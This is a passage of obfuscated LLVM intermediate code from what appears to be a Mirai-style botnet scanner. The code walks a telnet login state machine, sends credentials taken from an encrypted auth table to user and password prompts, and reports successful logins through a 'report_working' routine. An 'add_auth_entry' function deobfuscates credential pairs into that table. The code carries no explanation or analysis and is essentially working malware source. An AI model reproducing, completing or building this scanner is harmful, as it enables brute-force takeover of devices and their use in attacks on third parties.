  %794 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %793, i32 0, i32 1
  %795 = load i32, i32* %794, align 8
  %796 = srem i32 %795, 64
  %797 = zext i32 %796 to i64
  %798 = shl i64 1, %797
  %799 = xor i64 %792, -1
  %800 = xor i64 %798, -1
  %801 = xor i64 7688776957460523591, -1
  %802 = or i64 %799, %800
  %803 = or i64 7688776957460523591, %801
  %804 = xor i64 %802, -1
  %805 = and i64 %804, %803
  %806 = and i64 %792, %798
  %807 = icmp ne i64 %805, 0
  br i1 %807, label %808, label %1165

; <label>:808:                                    ; preds = %784
  br label %809

; <label>:809:                                    ; preds = %1163, %808
  %810 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %811 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %810, i32 0, i32 3
  %812 = load i32, i32* %811, align 8
  %813 = icmp eq i32 %812, 0
  br i1 %813, label %814, label %815

; <label>:814:                                    ; preds = %809
  br label %1164

; <label>:815:                                    ; preds = %809
  %816 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %817 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %816, i32 0, i32 6
  %818 = load i32, i32* %817, align 4
  %819 = icmp eq i32 %818, 256
  br i1 %819, label %820, label %834

; <label>:820:                                    ; preds = %815
  %821 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %822 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %821, i32 0, i32 7
  %823 = getelementptr inbounds [256 x i8], [256 x i8]* %822, i32 0, i32 0
  %824 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %825 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %824, i32 0, i32 7
  %826 = getelementptr inbounds [256 x i8], [256 x i8]* %825, i32 0, i32 0
  %827 = getelementptr inbounds i8, i8* %826, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %823, i8* %827, i64 192, i32 1, i1 false)
  %828 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %829 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %828, i32 0, i32 6
  %830 = load i32, i32* %829, align 4
  %831 = sub i32 0, 64
  %832 = add i32 %830, %831
  %833 = sub nsw i32 %830, 64
  store i32 %832, i32* %829, align 4
  br label %834

; <label>:834:                                    ; preds = %820, %815
  %835 = call i32* @__errno_location() #7
  store i32 0, i32* %835, align 4
  %836 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %837 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %836, i32 0, i32 1
  %838 = load i32, i32* %837, align 8
  %839 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %840 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %839, i32 0, i32 7
  %841 = getelementptr inbounds [256 x i8], [256 x i8]* %840, i32 0, i32 0
  %842 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %843 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %842, i32 0, i32 6
  %844 = load i32, i32* %843, align 4
  %845 = sext i32 %844 to i64
  %846 = getelementptr inbounds i8, i8* %841, i64 %845
  %847 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %848 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %847, i32 0, i32 6
  %849 = load i32, i32* %848, align 4
  %850 = add i32 256, -1972678585
  %851 = sub i32 %850, %849
  %852 = sub i32 %851, -1972678585
  %853 = sub nsw i32 256, %849
  %854 = call i32 @recv_strip_null(i32 %838, i8* %846, i32 %852, i32 16384)
  store i32 %854, i32* %32, align 4
  %855 = load i32, i32* %32, align 4
  %856 = icmp eq i32 %855, 0
  br i1 %856, label %857, label %859

; <label>:857:                                    ; preds = %834
  %858 = call i32* @__errno_location() #7
  store i32 104, i32* %858, align 4
  store i32 -1, i32* %32, align 4
  br label %859

; <label>:859:                                    ; preds = %857, %834
  %860 = load i32, i32* %32, align 4
  %861 = icmp eq i32 %860, -1
  br i1 %861, label %862, label %894

; <label>:862:                                    ; preds = %859
  %863 = call i32* @__errno_location() #7
  %864 = load i32, i32* %863, align 4
  %865 = icmp ne i32 %864, 11
  br i1 %865, label %866, label %893

; <label>:866:                                    ; preds = %862
  %867 = call i32* @__errno_location() #7
  %868 = load i32, i32* %867, align 4
  %869 = icmp ne i32 %868, 11
  br i1 %869, label %870, label %893

; <label>:870:                                    ; preds = %866
  %871 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %872 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %871, i32 0, i32 1
  %873 = load i32, i32* %872, align 8
  %874 = call i32 @close(i32 %873)
  %875 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %876 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %875, i32 0, i32 1
  store i32 -1, i32* %876, align 8
  %877 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %878 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %877, i32 0, i32 8
  %879 = load i8, i8* %878, align 8
  %880 = sub i8 0, 1
  %881 = sub i8 %879, %880
  %882 = add i8 %879, 1
  store i8 %881, i8* %878, align 8
  %883 = zext i8 %881 to i32
  %884 = icmp sge i32 %883, 10
  br i1 %884, label %885, label %890

; <label>:885:                                    ; preds = %870
  %886 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %887 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %886, i32 0, i32 8
  store i8 0, i8* %887, align 8
  %888 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %889 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %888, i32 0, i32 3
  store i32 0, i32* %889, align 8
  br label %892

; <label>:890:                                    ; preds = %870
  %891 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %891)
  br label %892

; <label>:892:                                    ; preds = %890, %885
  br label %893

; <label>:893:                                    ; preds = %892, %866, %862
  br label %1164

; <label>:894:                                    ; preds = %859
  %895 = load i32, i32* %32, align 4
  %896 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %897 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %896, i32 0, i32 6
  %898 = load i32, i32* %897, align 4
  %899 = add i32 %898, 741418893
  %900 = add i32 %899, %895
  %901 = sub i32 %900, 741418893
  %902 = add nsw i32 %898, %895
  store i32 %901, i32* %897, align 4
  %903 = load i32, i32* @fake_time, align 4
  %904 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %905 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %904, i32 0, i32 2
  store i32 %903, i32* %905, align 4
  br label %906

; <label>:906:                                    ; preds = %1162, %894
  store i32 0, i32* %33, align 4
  %907 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %908 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %907, i32 0, i32 3
  %909 = load i32, i32* %908, align 8
  switch i32 %909, label %1125 [
    i32 2, label %910
    i32 3, label %918
    i32 4, label %945
    i32 5, label %972
    i32 6, label %992
    i32 7, label %1012
    i32 8, label %1032
    i32 9, label %1052
    i32 10, label %1072
  ]

; <label>:910:                                    ; preds = %906
  %911 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %912 = call i32 @consume_iacs(%struct.scanner_connection* %911)
  store i32 %912, i32* %33, align 4
  %913 = icmp sgt i32 %912, 0
  br i1 %913, label %914, label %917

; <label>:914:                                    ; preds = %910
  %915 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %916 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %915, i32 0, i32 3
  store i32 3, i32* %916, align 8
  br label %917

; <label>:917:                                    ; preds = %914, %910
  br label %1126

; <label>:918:                                    ; preds = %906
  %919 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %920 = call i32 @consume_user_prompt(%struct.scanner_connection* %919)
  store i32 %920, i32* %33, align 4
  %921 = icmp sgt i32 %920, 0
  br i1 %921, label %922, label %944

; <label>:922:                                    ; preds = %918
  %923 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %924 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %923, i32 0, i32 1
  %925 = load i32, i32* %924, align 8
  %926 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %927 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %926, i32 0, i32 0
  %928 = load %struct.scanner_auth*, %struct.scanner_auth** %927, align 8
  %929 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %928, i32 0, i32 0
  %930 = load i8*, i8** %929, align 8
  %931 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %932 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %931, i32 0, i32 0
  %933 = load %struct.scanner_auth*, %struct.scanner_auth** %932, align 8
  %934 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %933, i32 0, i32 4
  %935 = load i8, i8* %934, align 4
  %936 = zext i8 %935 to i64
  %937 = call i64 @send(i32 %925, i8* %930, i64 %936, i32 16384)
  %938 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %939 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %938, i32 0, i32 1
  %940 = load i32, i32* %939, align 8
  %941 = call i64 @send(i32 %940, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %942 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %943 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %942, i32 0, i32 3
  store i32 4, i32* %943, align 8
  br label %944

; <label>:944:                                    ; preds = %922, %918
  br label %1126

; <label>:945:                                    ; preds = %906
  %946 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %947 = call i32 @consume_pass_prompt(%struct.scanner_connection* %946)
  store i32 %947, i32* %33, align 4
  %948 = icmp sgt i32 %947, 0
  br i1 %948, label %949, label %971

; <label>:949:                                    ; preds = %945
  %950 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %951 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %950, i32 0, i32 1
  %952 = load i32, i32* %951, align 8
  %953 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %954 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %953, i32 0, i32 0
  %955 = load %struct.scanner_auth*, %struct.scanner_auth** %954, align 8
  %956 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %955, i32 0, i32 1
  %957 = load i8*, i8** %956, align 8
  %958 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %959 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %958, i32 0, i32 0
  %960 = load %struct.scanner_auth*, %struct.scanner_auth** %959, align 8
  %961 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %960, i32 0, i32 5
  %962 = load i8, i8* %961, align 1
  %963 = zext i8 %962 to i64
  %964 = call i64 @send(i32 %952, i8* %957, i64 %963, i32 16384)
  %965 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %966 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %965, i32 0, i32 1
  %967 = load i32, i32* %966, align 8
  %968 = call i64 @send(i32 %967, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %969 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %970 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %969, i32 0, i32 3
  store i32 5, i32* %970, align 8
  br label %971

; <label>:971:                                    ; preds = %949, %945
  br label %1126

; <label>:972:                                    ; preds = %906
  %973 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %974 = call i32 @consume_any_prompt(%struct.scanner_connection* %973)
  store i32 %974, i32* %33, align 4
  %975 = icmp sgt i32 %974, 0
  br i1 %975, label %976, label %991

; <label>:976:                                    ; preds = %972
  call void @table_unlock_val(i8 zeroext 5)
  %977 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %977, i8** %34, align 8
  %978 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %979 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %978, i32 0, i32 1
  %980 = load i32, i32* %979, align 8
  %981 = load i8*, i8** %34, align 8
  %982 = load i32, i32* %35, align 4
  %983 = sext i32 %982 to i64
  %984 = call i64 @send(i32 %980, i8* %981, i64 %983, i32 16384)
  %985 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %986 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %985, i32 0, i32 1
  %987 = load i32, i32* %986, align 8
  %988 = call i64 @send(i32 %987, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %989 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %990 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %989, i32 0, i32 3
  store i32 6, i32* %990, align 8
  br label %991

; <label>:991:                                    ; preds = %976, %972
  br label %1126

; <label>:992:                                    ; preds = %906
  %993 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %994 = call i32 @consume_any_prompt(%struct.scanner_connection* %993)
  store i32 %994, i32* %33, align 4
  %995 = icmp sgt i32 %994, 0
  br i1 %995, label %996, label %1011

; <label>:996:                                    ; preds = %992
  call void @table_unlock_val(i8 zeroext 6)
  %997 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %997, i8** %36, align 8
  %998 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %999 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %998, i32 0, i32 1
  %1000 = load i32, i32* %999, align 8
  %1001 = load i8*, i8** %36, align 8
  %1002 = load i32, i32* %37, align 4
  %1003 = sext i32 %1002 to i64
  %1004 = call i64 @send(i32 %1000, i8* %1001, i64 %1003, i32 16384)
  %1005 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1006 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1005, i32 0, i32 1
  %1007 = load i32, i32* %1006, align 8
  %1008 = call i64 @send(i32 %1007, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %1009 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1010 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1009, i32 0, i32 3
  store i32 7, i32* %1010, align 8
  br label %1011

; <label>:1011:                                   ; preds = %996, %992
  br label %1126

; <label>:1012:                                   ; preds = %906
  %1013 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1014 = call i32 @consume_any_prompt(%struct.scanner_connection* %1013)
  store i32 %1014, i32* %33, align 4
  %1015 = icmp sgt i32 %1014, 0
  br i1 %1015, label %1016, label %1031

; <label>:1016:                                   ; preds = %1012
  call void @table_unlock_val(i8 zeroext 4)
  %1017 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %1017, i8** %38, align 8
  %1018 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1019 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1018, i32 0, i32 1
  %1020 = load i32, i32* %1019, align 8
  %1021 = load i8*, i8** %38, align 8
  %1022 = load i32, i32* %39, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = call i64 @send(i32 %1020, i8* %1021, i64 %1023, i32 16384)
  %1025 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1026 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1025, i32 0, i32 1
  %1027 = load i32, i32* %1026, align 8
  %1028 = call i64 @send(i32 %1027, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %1029 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1030 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1029, i32 0, i32 3
  store i32 8, i32* %1030, align 8
  br label %1031

; <label>:1031:                                   ; preds = %1016, %1012
  br label %1126

; <label>:1032:                                   ; preds = %906
  %1033 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1034 = call i32 @consume_any_prompt(%struct.scanner_connection* %1033)
  store i32 %1034, i32* %33, align 4
  %1035 = icmp sgt i32 %1034, 0
  br i1 %1035, label %1036, label %1051

; <label>:1036:                                   ; preds = %1032
  call void @table_unlock_val(i8 zeroext 7)
  %1037 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %1037, i8** %40, align 8
  %1038 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1039 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1038, i32 0, i32 1
  %1040 = load i32, i32* %1039, align 8
  %1041 = load i8*, i8** %40, align 8
  %1042 = load i32, i32* %41, align 4
  %1043 = sext i32 %1042 to i64
  %1044 = call i64 @send(i32 %1040, i8* %1041, i64 %1043, i32 16384)
  %1045 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1046 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1045, i32 0, i32 1
  %1047 = load i32, i32* %1046, align 8
  %1048 = call i64 @send(i32 %1047, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %1049 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1050 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1049, i32 0, i32 3
  store i32 9, i32* %1050, align 8
  br label %1051

; <label>:1051:                                   ; preds = %1036, %1032
  br label %1126

; <label>:1052:                                   ; preds = %906
  %1053 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1054 = call i32 @consume_any_prompt(%struct.scanner_connection* %1053)
  store i32 %1054, i32* %33, align 4
  %1055 = icmp sgt i32 %1054, 0
  br i1 %1055, label %1056, label %1071

; <label>:1056:                                   ; preds = %1052
  call void @table_unlock_val(i8 zeroext 8)
  %1057 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %1057, i8** %42, align 8
  %1058 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1059 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1058, i32 0, i32 1
  %1060 = load i32, i32* %1059, align 8
  %1061 = load i8*, i8** %42, align 8
  %1062 = load i32, i32* %43, align 4
  %1063 = sext i32 %1062 to i64
  %1064 = call i64 @send(i32 %1060, i8* %1061, i64 %1063, i32 16384)
  %1065 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1066 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1065, i32 0, i32 1
  %1067 = load i32, i32* %1066, align 8
  %1068 = call i64 @send(i32 %1067, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1069 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1070 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1069, i32 0, i32 3
  store i32 10, i32* %1070, align 8
  br label %1071

; <label>:1071:                                   ; preds = %1056, %1052
  br label %1126

; <label>:1072:                                   ; preds = %906
  %1073 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1074 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1073)
  store i32 %1074, i32* %33, align 4
  %1075 = load i32, i32* %33, align 4
  %1076 = icmp eq i32 %1075, -1
  br i1 %1076, label %1077, label %1102

; <label>:1077:                                   ; preds = %1072
  %1078 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1079 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1078, i32 0, i32 1
  %1080 = load i32, i32* %1079, align 8
  %1081 = call i32 @close(i32 %1080)
  %1082 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1083 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1082, i32 0, i32 1
  store i32 -1, i32* %1083, align 8
  %1084 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1085 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1084, i32 0, i32 8
  %1086 = load i8, i8* %1085, align 8
  %1087 = sub i8 0, %1086
  %1088 = sub i8 0, 1
  %1089 = add i8 %1087, %1088
  %1090 = sub i8 0, %1089
  %1091 = add i8 %1086, 1
  store i8 %1090, i8* %1085, align 8
  %1092 = zext i8 %1090 to i32
  %1093 = icmp eq i32 %1092, 10
  br i1 %1093, label %1094, label %1099

; <label>:1094:                                   ; preds = %1077
  %1095 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1096 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1095, i32 0, i32 8
  store i8 0, i8* %1096, align 8
  %1097 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1098 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1097, i32 0, i32 3
  store i32 0, i32* %1098, align 8
  br label %1101

; <label>:1099:                                   ; preds = %1077
  %1100 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1100)
  br label %1101

; <label>:1101:                                   ; preds = %1099, %1094
  br label %1124

; <label>:1102:                                   ; preds = %1072
  %1103 = load i32, i32* %33, align 4
  %1104 = icmp sgt i32 %1103, 0
  br i1 %1104, label %1105, label %1123

; <label>:1105:                                   ; preds = %1102
  %1106 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1107 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1106, i32 0, i32 4
  %1108 = load i32, i32* %1107, align 4
  %1109 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1110 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1109, i32 0, i32 5
  %1111 = load i16, i16* %1110, align 8
  %1112 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1113 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1112, i32 0, i32 0
  %1114 = load %struct.scanner_auth*, %struct.scanner_auth** %1113, align 8
  call void @report_working(i32 %1108, i16 zeroext %1111, %struct.scanner_auth* %1114)
  %1115 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1116 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1115, i32 0, i32 1
  %1117 = load i32, i32* %1116, align 8
  %1118 = call i32 @close(i32 %1117)
  %1119 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1120 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1119, i32 0, i32 1
  store i32 -1, i32* %1120, align 8
  %1121 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1122 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1121, i32 0, i32 3
  store i32 0, i32* %1122, align 8
  br label %1123

; <label>:1123:                                   ; preds = %1105, %1102
  br label %1124

; <label>:1124:                                   ; preds = %1123, %1101
  br label %1126

; <label>:1125:                                   ; preds = %906
  store i32 0, i32* %33, align 4
  br label %1126

; <label>:1126:                                   ; preds = %1125, %1124, %1071, %1051, %1031, %1011, %991, %971, %944, %917
  %1127 = load i32, i32* %33, align 4
  %1128 = icmp eq i32 %1127, 0
  br i1 %1128, label %1129, label %1130

; <label>:1129:                                   ; preds = %1126
  br label %1163

; <label>:1130:                                   ; preds = %1126
  %1131 = load i32, i32* %33, align 4
  %1132 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1132, i32 0, i32 6
  %1134 = load i32, i32* %1133, align 4
  %1135 = icmp sgt i32 %1131, %1134
  br i1 %1135, label %1136, label %1140

; <label>:1136:                                   ; preds = %1130
  %1137 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1138 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1137, i32 0, i32 6
  %1139 = load i32, i32* %1138, align 4
  store i32 %1139, i32* %33, align 4
  br label %1140

; <label>:1140:                                   ; preds = %1136, %1130
  %1141 = load i32, i32* %33, align 4
  %1142 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1143 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1142, i32 0, i32 6
  %1144 = load i32, i32* %1143, align 4
  %1145 = sub i32 %1144, 859606514
  %1146 = sub i32 %1145, %1141
  %1147 = add i32 %1146, 859606514
  %1148 = sub nsw i32 %1144, %1141
  store i32 %1147, i32* %1143, align 4
  %1149 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1150 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1149, i32 0, i32 7
  %1151 = getelementptr inbounds [256 x i8], [256 x i8]* %1150, i32 0, i32 0
  %1152 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1153 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1152, i32 0, i32 7
  %1154 = getelementptr inbounds [256 x i8], [256 x i8]* %1153, i32 0, i32 0
  %1155 = load i32, i32* %33, align 4
  %1156 = sext i32 %1155 to i64
  %1157 = getelementptr inbounds i8, i8* %1154, i64 %1156
  %1158 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1159 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1158, i32 0, i32 6
  %1160 = load i32, i32* %1159, align 4
  %1161 = sext i32 %1160 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1151, i8* %1157, i64 %1161, i32 1, i1 false)
  br label %1162

; <label>:1162:                                   ; preds = %1140
  br label %906

; <label>:1163:                                   ; preds = %1129
  br label %809

; <label>:1164:                                   ; preds = %893, %814
  br label %1165

; <label>:1165:                                   ; preds = %1164, %784
  br label %1166

; <label>:1166:                                   ; preds = %1165, %772, %728
  %1167 = load i32, i32* %1, align 4
  %1168 = sub i32 0, 1
  %1169 = sub i32 %1167, %1168
  %1170 = add nsw i32 %1167, 1
  store i32 %1169, i32* %1, align 4
  br label %716

; <label>:1171:                                   ; preds = %716
  br label %253
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add i32 %10, -1387684021
  %12 = add i32 %11, 1
  %13 = sub i32 %12, -1387684021
  %14 = add nsw i32 %10, 1
  %15 = sext i32 %13 to i64
  %16 = mul i64 %15, 24
  %17 = call i8* @realloc(i8* %9, i64 %16) #6
  %18 = bitcast i8* %17 to %struct.scanner_auth*
  store %struct.scanner_auth* %18, %struct.scanner_auth** @auth_table, align 8
  %19 = load i8*, i8** %4, align 8
  %20 = call i8* @deobf(i8* %19, i32* %7)
  %21 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %22 = load i32, i32* @auth_table_len, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23
  %25 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %24, i32 0, i32 0
  store i8* %20, i8** %25, align 8
  %26 = load i32, i32* %7, align 4
  %27 = trunc i32 %26 to i8
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* @auth_table_len, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 4
  store i8 %27, i8* %32, align 4
  %33 = load i8*, i8** %5, align 8
  %34 = call i8* @deobf(i8* %33, i32* %7)
  %35 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %36 = load i32, i32* @auth_table_len, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i64 %37
  %39 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %38, i32 0, i32 1
  store i8* %34, i8** %39, align 8
  %40 = load i32, i32* %7, align 4
  %41 = trunc i32 %40 to i8
  %42 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %43 = load i32, i32* @auth_table_len, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i64 %44
  %46 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i32 0, i32 5
  store i8 %41, i8* %46, align 1
